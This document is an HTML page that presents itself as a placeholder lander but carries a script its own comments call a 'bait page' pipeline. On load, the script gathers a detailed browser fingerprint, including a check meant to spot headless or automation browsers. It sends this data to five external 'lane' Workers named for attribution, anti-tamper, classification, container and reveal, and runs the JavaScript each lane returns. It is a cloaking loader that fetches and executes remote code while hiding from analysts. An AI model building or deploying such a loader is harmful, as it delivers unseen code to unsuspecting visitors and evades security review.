<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
  <title>Placeholder — Discover Something New</title>
  <style>
    :root { color-scheme: light; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
    * { box-sizing: border-box; }
    body { margin: 0; background: #f7f7f8; color: #17171a; }
    .lander { min-height: 100svh; display: grid; place-items: center; padding: 28px 20px; }
    .card { width: min(100%, 520px); background: #fff; border-radius: 24px; padding: 34px 24px; box-shadow: 0 18px 60px rgba(0,0,0,.10); text-align: center; }
    h1 { margin: 20px 0 12px; font-size: clamp(34px, 10vw, 54px); line-height: 1.02; letter-spacing: -.04em; }
    .lead { margin: 0 auto; max-width: 390px; color: #626268; font-size: 17px; line-height: 1.55; }
  </style>
</head>
<body>
  <main class="lander">
    <section class="card">
      <h1>Placeholder content</h1>
      <p class="lead">Replace with genuinely unrelated content before this goes live — see docs/build-spec.md §1.</p>
    </section>
  </main>

<script>
(() => {
  "use strict";

  // §12 kill switch — flip to true and redeploy to make the whole pipeline
  // inert (bait page behaves like a plain static site) without touching
  // any of the 5 lane Workers.
  const KILL_SWITCH = false;

  const ENTRY_ENDPOINT = "/session";

  // TODO: replace with your own deployed lane subdomains before going live.
  const LANES = [
    "https://tds-lane-1-attribution.t9k2x8mq.workers.dev/deliver",
    "https://tds-lane-2-antitamper.t9k2x8mq.workers.dev/deliver",
    "https://tds-lane-3-classify.t9k2x8mq.workers.dev/deliver",
    "https://tds-lane-4-container.t9k2x8mq.workers.dev/deliver",
    "https://tds-lane-5-reveal.t9k2x8mq.workers.dev/deliver",
  ];

  const REQUEST_TIMEOUT_MS = 12000;

  function safeValue(fn, fallback = null) {
    try { return fn(); } catch { return fallback; }
  }
  function safeBool(fn) {
    try { return !!fn(); } catch { return null; }
  }
  function safeString(value) {
    try { return typeof value === "string" ? value : String(value ?? ""); } catch { return ""; }
  }

  async function fetchWithTimeout(url, options = {}) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), REQUEST_TIMEOUT_MS);
    try {
      return await fetch(url, { ...options, signal: controller.signal });
    } finally {
      clearTimeout(timer);
    }
  }

  async function requestEntryBootstrap() {
    const response = await fetchWithTimeout(ENTRY_ENDPOINT, {
      method: "POST",
      credentials: "same-origin",
      cache: "no-store",
      headers: { "Content-Type": "application/json", "Accept": "application/json" },
      body: JSON.stringify({}),
    });
    if (!response.ok) throw new Error("Entry request failed: " + response.status);
    const bootstrap = await response.json();
    if (!bootstrap || typeof bootstrap !== "object" || Array.isArray(bootstrap)) {
      throw new Error("Invalid entry response");
    }
    return bootstrap;
  }

  // --- §3 fingerprint collector -------------------------------------------
  // Not exhaustive (see docs/build-spec.md §3 for the full category list) —
  // enough structure to build/test against, extend as needed. The one part
  // worth getting right is collectGlobalSurface() below.

  function collectNavigator() {
    return {
      userAgent: safeString(navigator.userAgent),
      appVersion: safeString(navigator.appVersion),
      platform: safeString(navigator.platform),
      vendor: safeString(navigator.vendor),
      language: safeString(navigator.language),
      languages: safeValue(() => Array.from(navigator.languages || []), []),
      cookieEnabled: safeValue(() => navigator.cookieEnabled, null),
      onLine: safeValue(() => navigator.onLine, null),
      hardwareConcurrency: safeValue(() => navigator.hardwareConcurrency, null),
      deviceMemory: safeValue(() => navigator.deviceMemory, null),
      maxTouchPoints: safeValue(() => navigator.maxTouchPoints, null),
      webdriver: safeValue(() => navigator.webdriver, null),
      pdfViewerEnabled: safeValue(() => navigator.pdfViewerEnabled, null),
      virtualKeyboard: "virtualKeyboard" in navigator,
    };
  }

  function collectClientHints() {
    const uaData = safeValue(() => navigator.userAgentData, null);
    if (!uaData) return { supported: false };
    return {
      supported: true,
      mobile: safeValue(() => uaData.mobile, null),
      platform: safeValue(() => uaData.platform, null),
      brands: safeValue(() => Array.from(uaData.brands || []), []),
    };
  }

  function collectNetwork() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
    if (!connection) return { supported: false };
    return {
      supported: true,
      effectiveType: safeValue(() => connection.effectiveType, null),
      type: safeValue(() => connection.type, null),
      downlink: safeValue(() => connection.downlink, null),
      rtt: safeValue(() => connection.rtt, null),
      saveData: safeValue(() => connection.saveData, null),
    };
  }

  function collectWebGL(contextName) {
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext(contextName, { alpha: true, antialias: true, depth: true });
      if (!gl) return { supported: false };
      const debugInfo = safeValue(() => gl.getExtension("WEBGL_debug_renderer_info"), null);
      const result = {
        supported: true,
        vendor: safeString(gl.getParameter(gl.VENDOR)),
        renderer: safeString(gl.getParameter(gl.RENDERER)),
        version: safeString(gl.getParameter(gl.VERSION)),
        shadingLanguageVersion: safeString(gl.getParameter(gl.SHADING_LANGUAGE_VERSION)),
        unmaskedVendor: debugInfo ? safeString(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)) : "",
        unmaskedRenderer: debugInfo ? safeString(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)) : "",
        extensions: safeValue(() => (gl.getSupportedExtensions() || []).sort(), []),
      };
      const limits = {};
      for (const name of ["MAX_TEXTURE_SIZE","MAX_VIEWPORT_DIMS","MAX_VERTEX_ATTRIBS","MAX_TEXTURE_IMAGE_UNITS","MAX_VERTEX_UNIFORM_VECTORS","MAX_FRAGMENT_UNIFORM_VECTORS"]) {
        try { const v = gl.getParameter(gl[name]); limits[name] = ArrayBuffer.isView(v) ? Array.from(v) : v; } catch {}
      }
      result.limits = limits;
      try {
        const vh = gl.getShaderPrecisionFormat(gl.VERTEX_SHADER, gl.HIGH_FLOAT);
        const fh = gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT);
        result.shaderPrecision = {
          vertexHighFloat: vh ? { rangeMin: vh.rangeMin, rangeMax: vh.rangeMax, precision: vh.precision } : null,
          fragmentHighFloat: fh ? { rangeMin: fh.rangeMin, rangeMax: fh.rangeMax, precision: fh.precision } : null,
        };
      } catch {}
      return result;
    } catch (error) {
      return { supported: false, error: safeString(error?.name || "error") };
    }
  }

  function collectDisplay() {
    return {
      screen: safeValue(() => ({
        width: screen.width, height: screen.height,
        availWidth: screen.availWidth, availHeight: screen.availHeight,
        colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
      }), null),
      viewport: {
        innerWidth: safeValue(() => window.innerWidth, null),
        innerHeight: safeValue(() => window.innerHeight, null),
        outerWidth: safeValue(() => window.outerWidth, null),
        outerHeight: safeValue(() => window.outerHeight, null),
        visualViewport: window.visualViewport ? {
          width: safeValue(() => window.visualViewport.width, null),
          height: safeValue(() => window.visualViewport.height, null),
          scale: safeValue(() => window.visualViewport.scale, null),
        } : null,
      },
      devicePixelRatio: safeValue(() => window.devicePixelRatio, null),
    };
  }

  function collectStorage() {
    return {
      localStorage: safeBool(() => { const k = "__t" + Math.random(); localStorage.setItem(k, "1"); localStorage.removeItem(k); return true; }),
      sessionStorage: safeBool(() => { const k = "__t" + Math.random(); sessionStorage.setItem(k, "1"); sessionStorage.removeItem(k); return true; }),
      indexedDB: typeof indexedDB !== "undefined",
      cacheStorage: typeof caches !== "undefined",
      storageManager: !!(navigator.storage),
    };
  }

  function collectSecurity() {
    return {
      isSecureContext: window.isSecureContext === true,
      crypto: typeof crypto !== "undefined",
      subtleCrypto: typeof crypto?.subtle !== "undefined",
      crossOriginIsolated: window.crossOriginIsolated === true,
      origin: safeString(location.origin),
      protocol: safeString(location.protocol),
    };
  }

  function collectPayments() {
    return {
      applePay: {
        apiAvailable: typeof window.ApplePaySession !== "undefined",
        canMakePayments: safeValue(() => {
          if (typeof window.ApplePaySession?.canMakePayments !== "function") return null;
          return window.ApplePaySession.canMakePayments();
        }, null),
      },
      paymentRequest: { apiAvailable: typeof window.PaymentRequest !== "undefined" },
    };
  }

  function collectCSSCapabilities() {
    function mq(q) { try { return matchMedia(q).matches; } catch { return null; } }
    return {
      darkMode: mq("(prefers-color-scheme: dark)"),
      reducedMotion: mq("(prefers-reduced-motion: reduce)"),
      standalone: mq("(display-mode: standalone)"),
      displayP3: mq("(color-gamut: p3)"),
      pointerCoarse: mq("(pointer: coarse)"),
      pointerFine: mq("(pointer: fine)"),
      hoverHover: mq("(hover: hover)"),
      cssSupports: {
        backdropFilter: safeValue(() => CSS.supports("backdrop-filter", "blur(1px)"), false),
        webkitTouchCallout: safeValue(() => CSS.supports("-webkit-touch-callout", "none"), false),
      },
    };
  }

  function collectMediaSourceCapabilities() {
    function mse(mime) { try { return typeof MediaSource !== "undefined" && MediaSource.isTypeSupported(mime); } catch { return null; } }
    return {
      supported: typeof MediaSource !== "undefined",
      codecs: {
        h264Baseline: mse('video/mp4; codecs="avc1.42E01E"'),
        h264High: mse('video/mp4; codecs="avc1.640028"'),
        hevc: mse('video/mp4; codecs="hvc1.1.6.L93.B0"'),
        vp9: mse('video/webm; codecs="vp9"'),
        av1: mse('video/mp4; codecs="av01.0.05M.08"'),
        aac: mse('audio/mp4; codecs="mp4a.40.2"'),
        opus: mse('audio/webm; codecs="opus"'),
      },
    };
  }

  function collectHTMLMediaCapabilities() {
    const video = document.createElement("video");
    const audio = document.createElement("audio");
    function cp(el, mime) { try { return el.canPlayType(mime) || ""; } catch { return null; } }
    return {
      video: { h264: cp(video,'video/mp4; codecs="avc1.42E01E"'), vp9: cp(video,'video/webm; codecs="vp9"'), av1: cp(video,'video/mp4; codecs="av01.0.05M.08"') },
      audio: { aac: cp(audio,'audio/mp4; codecs="mp4a.40.2"'), opus: cp(audio,'audio/webm; codecs="opus"') },
    };
  }

  function collectWorkerCapabilities() {
    return {
      worker: typeof Worker !== "undefined",
      sharedWorker: typeof SharedWorker !== "undefined",
      serviceWorker: "serviceWorker" in navigator,
      offscreenCanvas: typeof OffscreenCanvas !== "undefined",
    };
  }

  function collectHardwareCapabilities() {
    return {
      bluetooth: "bluetooth" in navigator,
      usb: "usb" in navigator,
      gpu: "gpu" in navigator,
      xr: "xr" in navigator,
      geolocation: "geolocation" in navigator,
      mediaDevices: "mediaDevices" in navigator,
      wakeLock: "wakeLock" in navigator,
      share: typeof navigator.share === "function",
      vibration: typeof navigator.vibrate === "function",
      clipboard: "clipboard" in navigator,
      credentials: "credentials" in navigator,
    };
  }

  function collectWebAuthn() {
    return {
      publicKeyCredential: typeof PublicKeyCredential !== "undefined",
      conditionalMediation: typeof PublicKeyCredential !== "undefined" && typeof PublicKeyCredential.isConditionalMediationAvailable === "function",
      platformAuthenticator: typeof PublicKeyCredential !== "undefined" && typeof PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable === "function",
    };
  }

  function collectPerformanceCapabilities() {
    const memAvail = typeof performance !== "undefined" && typeof performance.memory !== "undefined";
    const result = { memoryAvailable: memAvail };
    if (memAvail) {
      result.memory = {
        jsHeapSizeLimit: safeValue(() => performance.memory.jsHeapSizeLimit, null),
        totalJSHeapSize: safeValue(() => performance.memory.totalJSHeapSize, null),
        usedJSHeapSize: safeValue(() => performance.memory.usedJSHeapSize, null),
      };
    }
    return result;
  }

  // The one piece worth getting right: enumerate every own property on
  // `window` and tag its type — this is what differentiates a real browser
  // from a headless/automation global surface. See docs/build-spec.md §3.
  function collectGlobalSurface() {
    const surface = {};
    try {
      for (const name of Object.getOwnPropertyNames(window)) {
        try {
          const value = window[name];
          surface[name] = { type: typeof value, tag: Object.prototype.toString.call(value) };
        } catch {
          surface[name] = { type: "inaccessible", tag: null };
        }
      }
    } catch {}
    return surface;
  }

  async function collectRiskTelemetry() {
    return {
      collectedAt: Date.now(),
      navigator: collectNavigator(),
      clientHints: collectClientHints(),
      network: collectNetwork(),
      graphics: { webgl: collectWebGL("webgl"), webgl2: collectWebGL("webgl2"), webgpu: { supported: "gpu" in navigator } },
      display: collectDisplay(),
      storage: collectStorage(),
      security: collectSecurity(),
      payments: collectPayments(),
      css: collectCSSCapabilities(),
      mediaSourceCapabilities: collectMediaSourceCapabilities(),
      htmlMediaCapabilities: collectHTMLMediaCapabilities(),
      workers: collectWorkerCapabilities(),
      hardware: collectHardwareCapabilities(),
      webauthn: collectWebAuthn(),
      performance: collectPerformanceCapabilities(),
      document: {
        referrer: safeString(document.referrer),
        hidden: safeValue(() => document.hidden, null),
        visibilityState: safeString(document.visibilityState),
        characterSet: safeString(document.characterSet),
        hasFocus: safeValue(() => document.hasFocus(), null),
      },
      globalSurface: collectGlobalSurface(),
    };
  }

  // --- §2 orchestrator ------------------------------------------------------

  function executeStage(code, stageNumber) {
    if (typeof code !== "string") throw new Error("Invalid stage response");
    const script = document.createElement("script");
    script.type = "text/javascript";
    script.text = code + "\n//# sourceURL=delivery-stage-" + stageNumber + ".js";
    document.documentElement.appendChild(script);
    script.remove();
  }

  async function requestStage(endpoint, payload) {
    const response = await fetchWithTimeout(endpoint, {
      method: "POST",
      mode: "cors",
      credentials: "omit",
      cache: "no-store",
      headers: { "Content-Type": "application/json", "Accept": "application/javascript" },
      body: JSON.stringify(payload),
    });
    if (!response.ok) throw new Error("Delivery request failed: " + response.status);
    return response.text();
  }

  async function start() {
    if (KILL_SWITCH) return;

    const bootstrap = await requestEntryBootstrap();
    const telemetry = await collectRiskTelemetry();
    const payload = { ...bootstrap, telemetry };

    for (let i = 0; i < LANES.length; i++) {
      const code = await requestStage(LANES[i], payload);
      executeStage(code, i + 1);
    }
  }

  let started = false;
  async function boot() {
    if (started) return;
    started = true;
    try {
      await start();
    } catch (error) {
      console.error("Bootstrap/delivery failure", error);
    }
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", boot, { once: true });
  } else {
    boot();
  }
})();
</script>
</body>
</html>
